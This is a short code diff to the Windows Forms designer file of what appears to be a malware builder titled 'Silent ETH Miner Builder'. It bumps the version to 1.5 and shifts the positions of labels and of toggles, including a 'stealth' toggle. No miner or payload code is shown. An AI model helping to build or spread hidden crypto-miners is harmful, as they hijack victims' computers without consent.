@@ -300,7 +300,7 @@ Partial Class Form1
         Me.Label18.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label18.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label18.ForeColor = System.Drawing.Color.Teal
-        Me.Label18.Location = New System.Drawing.Point(71, 70)
+        Me.Label18.Location = New System.Drawing.Point(71, 77)
         Me.Label18.Name = "Label18"
         Me.Label18.Size = New System.Drawing.Size(13, 13)
         Me.Label18.TabIndex = 71
@@ -339,7 +339,7 @@ Partial Class Form1
         Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label26.ForeColor = System.Drawing.Color.Teal
-        Me.Label26.Location = New System.Drawing.Point(55, 43)
+        Me.Label26.Location = New System.Drawing.Point(55, 46)
         Me.Label26.Name = "Label26"
         Me.Label26.Size = New System.Drawing.Size(13, 13)
         Me.Label26.TabIndex = 57
@@ -403,7 +403,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent ETH Miner Builder 1.4.2"
+        Me.MephForm1.Text = "Silent ETH Miner Builder 1.5"
         '
         'MephTabcontrol2
         '
@@ -1089,7 +1089,7 @@ Partial Class Form1
         '
         Me.Label19.AutoSize = True
         Me.Label19.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label19.Location = New System.Drawing.Point(10, 67)
+        Me.Label19.Location = New System.Drawing.Point(10, 74)
         Me.Label19.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label19.Name = "Label19"
         Me.Label19.Size = New System.Drawing.Size(65, 17)
@@ -1101,7 +1101,7 @@ Partial Class Form1
         Me.toggleEnableETC.BackColor = System.Drawing.Color.Transparent
         Me.toggleEnableETC.Checked = False
         Me.toggleEnableETC.ForeColor = System.Drawing.Color.Black
-        Me.toggleEnableETC.Location = New System.Drawing.Point(104, 66)
+        Me.toggleEnableETC.Location = New System.Drawing.Point(104, 73)
         Me.toggleEnableETC.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleEnableETC.Name = "toggleEnableETC"
         Me.toggleEnableETC.Size = New System.Drawing.Size(50, 24)
@@ -1228,7 +1228,7 @@ Partial Class Form1
         '
         Me.Label27.AutoSize = True
         Me.Label27.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label27.Location = New System.Drawing.Point(10, 40)
+        Me.Label27.Location = New System.Drawing.Point(10, 43)
         Me.Label27.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label27.Name = "Label27"
         Me.Label27.Size = New System.Drawing.Size(50, 17)
@@ -1240,7 +1240,7 @@ Partial Class Form1
         Me.toggleEnableStealth.BackColor = System.Drawing.Color.Transparent
         Me.toggleEnableStealth.Checked = False
         Me.toggleEnableStealth.ForeColor = System.Drawing.Color.Black
-        Me.toggleEnableStealth.Location = New System.Drawing.Point(104, 39)
+        Me.toggleEnableStealth.Location = New System.Drawing.Point(104, 42)
         Me.toggleEnableStealth.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleEnableStealth.Name = "toggleEnableStealth"
         Me.toggleEnableStealth.Size = New System.Drawing.Size(50, 24)
